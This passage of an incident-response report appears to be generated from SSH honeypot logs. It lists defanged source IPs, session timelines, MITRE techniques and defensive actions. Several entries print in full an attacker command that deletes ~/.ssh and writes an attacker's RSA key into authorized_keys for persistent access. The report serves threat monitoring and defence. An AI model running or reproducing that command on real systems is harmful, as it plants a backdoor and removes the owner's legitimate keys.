| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:08:50` | `cowrie.session.connect` |
| `2026-04-17 03:08:50` | `cowrie.client.version` |
| `2026-04-17 03:08:50` | `cowrie.client.kex` |
| `2026-04-17 03:08:51` | `cowrie.login.success` |
| `2026-04-17 03:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc7a4a0393c2

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:09 |
| **Last Seen** | 2026-04-17 03:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:09:15` | `cowrie.session.connect` |
| `2026-04-17 03:09:15` | `cowrie.client.version` |
| `2026-04-17 03:09:15` | `cowrie.client.kex` |
| `2026-04-17 03:09:16` | `cowrie.login.success` |
| `2026-04-17 03:09:17` | `cowrie.session.params` |
| `2026-04-17 03:09:17` | `cowrie.command.input` |
| `2026-04-17 03:09:17` | `cowrie.command.failed` |
| `2026-04-17 03:09:17` | `cowrie.log.closed` |
| `2026-04-17 03:09:17` | `cowrie.session.params` |
| `2026-04-17 03:09:17` | `cowrie.command.input` |
| `2026-04-17 03:09:18` | `cowrie.session.file_download` |
| `2026-04-17 03:09:18` | `cowrie.log.closed` |
| `2026-04-17 03:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cae0d23e2c4

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:09 |
| **Last Seen** | 2026-04-17 03:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:09:21` | `cowrie.session.connect` |
| `2026-04-17 03:09:21` | `cowrie.client.version` |
| `2026-04-17 03:09:21` | `cowrie.client.kex` |
| `2026-04-17 03:09:22` | `cowrie.login.success` |
| `2026-04-17 03:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b2e1ed0c93

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-04-17 03:10 |
| **Last Seen** | 2026-04-17 03:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:10:03` | `cowrie.session.connect` |
| `2026-04-17 03:10:03` | `cowrie.client.version` |
| `2026-04-17 03:10:03` | `cowrie.client.kex` |
| `2026-04-17 03:10:04` | `cowrie.login.success` |
| `2026-04-17 03:10:04` | `cowrie.session.params` |
| `2026-04-17 03:10:04` | `cowrie.command.input` |
| `2026-04-17 03:10:04` | `cowrie.command.failed` |
| `2026-04-17 03:10:04` | `cowrie.log.closed` |
| `2026-04-17 03:10:05` | `cowrie.session.params` |
| `2026-04-17 03:10:05` | `cowrie.command.input` |
| `2026-04-17 03:10:05` | `cowrie.session.file_download` |
| `2026-04-17 03:10:05` | `cowrie.log.closed` |
| `2026-04-17 03:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499c7d8f54c7

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:10 |
| **Last Seen** | 2026-04-17 03:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:10:06` | `cowrie.session.connect` |
| `2026-04-17 03:10:06` | `cowrie.client.version` |
| `2026-04-17 03:10:07` | `cowrie.client.kex` |
| `2026-04-17 03:10:07` | `cowrie.login.success` |
| `2026-04-17 03:10:07` | `cowrie.session.params` |
| `2026-04-17 03:10:07` | `cowrie.command.input` |
| `2026-04-17 03:10:07` | `cowrie.command.failed` |
| `2026-04-17 03:10:08` | `cowrie.log.closed` |
| `2026-04-17 03:10:08` | `cowrie.session.params` |
| `2026-04-17 03:10:08` | `cowrie.command.input` |
| `2026-04-17 03:10:08` | `cowrie.session.file_download` |
| `2026-04-17 03:10:08` | `cowrie.log.closed` |
| `2026-04-17 03:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d6d00515b7

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-04-17 03:10 |
| **Last Seen** | 2026-04-17 03:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:10:07` | `cowrie.session.connect` |
| `2026-04-17 03:10:07` | `cowrie.client.version` |
| `2026-04-17 03:10:07` | `cowrie.client.kex` |
| `2026-04-17 03:10:08` | `cowrie.login.success` |
| `2026-04-17 03:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed3ec810a616

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:10 |
| **Last Seen** | 2026-04-17 03:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:10:10` | `cowrie.session.connect` |
| `2026-04-17 03:10:10` | `cowrie.client.version` |
| `2026-04-17 03:10:10` | `cowrie.client.kex` |
| `2026-04-17 03:10:11` | `cowrie.login.success` |
| `2026-04-17 03:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-908ea2a4f2d9

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:10 |
| **Last Seen** | 2026-04-17 03:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:10:20` | `cowrie.session.connect` |
| `2026-04-17 03:10:20` | `cowrie.client.version` |
| `2026-04-17 03:10:21` | `cowrie.client.kex` |
| `2026-04-17 03:10:22` | `cowrie.login.success` |
| `2026-04-17 03:10:23` | `cowrie.session.params` |
| `2026-04-17 03:10:23` | `cowrie.command.input` |
| `2026-04-17 03:10:23` | `cowrie.command.failed` |
| `2026-04-17 03:10:23` | `cowrie.log.closed` |
| `2026-04-17 03:10:24` | `cowrie.session.params` |
| `2026-04-17 03:10:24` | `cowrie.command.input` |
| `2026-04-17 03:10:24` | `cowrie.session.file_download` |
| `2026-04-17 03:10:24` | `cowrie.log.closed` |
| `2026-04-17 03:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2e3f61b4706

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:10 |
| **Last Seen** | 2026-04-17 03:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:10:28` | `cowrie.session.connect` |
| `2026-04-17 03:10:28` | `cowrie.client.version` |
| `2026-04-17 03:10:28` | `cowrie.client.kex` |
| `2026-04-17 03:10:29` | `cowrie.login.success` |
| `2026-04-17 03:10:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fac4316e2456

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-17 03:10 |
| **Last Seen** | 2026-04-17 03:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:10:55` | `cowrie.session.connect` |
| `2026-04-17 03:10:55` | `cowrie.client.version` |
| `2026-04-17 03:10:55` | `cowrie.client.kex` |
| `2026-04-17 03:10:55` | `cowrie.login.success` |
| `2026-04-17 03:10:55` | `cowrie.session.params` |
| `2026-04-17 03:10:55` | `cowrie.command.input` |
| `2026-04-17 03:10:55` | `cowrie.command.failed` |
| `2026-04-17 03:10:56` | `cowrie.log.closed` |
| `2026-04-17 03:10:56` | `cowrie.session.params` |
| `2026-04-17 03:10:56` | `cowrie.command.input` |
| `2026-04-17 03:10:56` | `cowrie.session.file_download` |
| `2026-04-17 03:10:56` | `cowrie.log.closed` |
| `2026-04-17 03:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b63c9f28fac

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-17 03:10 |
| **Last Seen** | 2026-04-17 03:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:10:57` | `cowrie.session.connect` |
| `2026-04-17 03:10:57` | `cowrie.client.version` |
| `2026-04-17 03:10:57` | `cowrie.client.kex` |
| `2026-04-17 03:10:58` | `cowrie.login.success` |
| `2026-04-17 03:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f391b998d05b

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:11 |
| **Last Seen** | 2026-04-17 03:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:11:04` | `cowrie.session.connect` |
| `2026-04-17 03:11:04` | `cowrie.client.version` |
| `2026-04-17 03:11:05` | `cowrie.client.kex` |
| `2026-04-17 03:11:06` | `cowrie.login.success` |
| `2026-04-17 03:11:06` | `cowrie.session.params` |
| `2026-04-17 03:11:06` | `cowrie.command.input` |
| `2026-04-17 03:11:06` | `cowrie.command.failed` |
| `2026-04-17 03:11:06` | `cowrie.log.closed` |
| `2026-04-17 03:11:07` | `cowrie.session.params` |
| `2026-04-17 03:11:07` | `cowrie.command.input` |
| `2026-04-17 03:11:07` | `cowrie.session.file_download` |
| `2026-04-17 03:11:07` | `cowrie.log.closed` |
| `2026-04-17 03:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6291d8e5c8d3

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:11 |
| **Last Seen** | 2026-04-17 03:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:11:10` | `cowrie.session.connect` |
| `2026-04-17 03:11:10` | `cowrie.client.version` |
| `2026-04-17 03:11:11` | `cowrie.client.kex` |
| `2026-04-17 03:11:11` | `cowrie.login.success` |
| `2026-04-17 03:11:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6bcdd9231b

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-04-17 03:11 |
| **Last Seen** | 2026-04-17 03:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:11:42` | `cowrie.session.connect` |
| `2026-04-17 03:11:42` | `cowrie.client.version` |
| `2026-04-17 03:11:43` | `cowrie.client.kex` |
| `2026-04-17 03:11:43` | `cowrie.login.success` |
| `2026-04-17 03:11:44` | `cowrie.session.params` |
| `2026-04-17 03:11:44` | `cowrie.command.input` |
| `2026-04-17 03:11:44` | `cowrie.command.failed` |
| `2026-04-17 03:11:44` | `cowrie.log.closed` |
| `2026-04-17 03:11:44` | `cowrie.session.params` |
| `2026-04-17 03:11:44` | `cowrie.command.input` |
| `2026-04-17 03:11:44` | `cowrie.session.file_download` |
| `2026-04-17 03:11:44` | `cowrie.log.closed` |
| `2026-04-17 03:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ba2b490184f

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-04-17 03:11 |
| **Last Seen** | 2026-04-17 03:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:11:46` | `cowrie.session.connect` |
| `2026-04-17 03:11:46` | `cowrie.client.version` |
| `2026-04-17 03:11:46` | `cowrie.client.kex` |
| `2026-04-17 03:11:47` | `cowrie.login.success` |
| `2026-04-17 03:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e26b64fe9860

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:11 |
| **Last Seen** | 2026-04-17 03:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:11:51` | `cowrie.session.connect` |
| `2026-04-17 03:11:51` | `cowrie.client.version` |
| `2026-04-17 03:11:52` | `cowrie.client.kex` |
| `2026-04-17 03:11:53` | `cowrie.login.success` |
| `2026-04-17 03:11:54` | `cowrie.session.params` |
| `2026-04-17 03:11:54` | `cowrie.command.input` |
| `2026-04-17 03:11:54` | `cowrie.command.failed` |
| `2026-04-17 03:11:54` | `cowrie.log.closed` |
| `2026-04-17 03:11:55` | `cowrie.session.params` |
| `2026-04-17 03:11:55` | `cowrie.command.input` |
| `2026-04-17 03:11:55` | `cowrie.session.file_download` |
| `2026-04-17 03:11:55` | `cowrie.log.closed` |
| `2026-04-17 03:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87404ffffbc2

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:11 |
| **Last Seen** | 2026-04-17 03:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:11:59` | `cowrie.session.connect` |
| `2026-04-17 03:11:59` | `cowrie.client.version` |
| `2026-04-17 03:11:59` | `cowrie.client.kex` |
| `2026-04-17 03:12:00` | `cowrie.login.success` |
| `2026-04-17 03:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96e2692284e0

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:12 |
| **Last Seen** | 2026-04-17 03:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
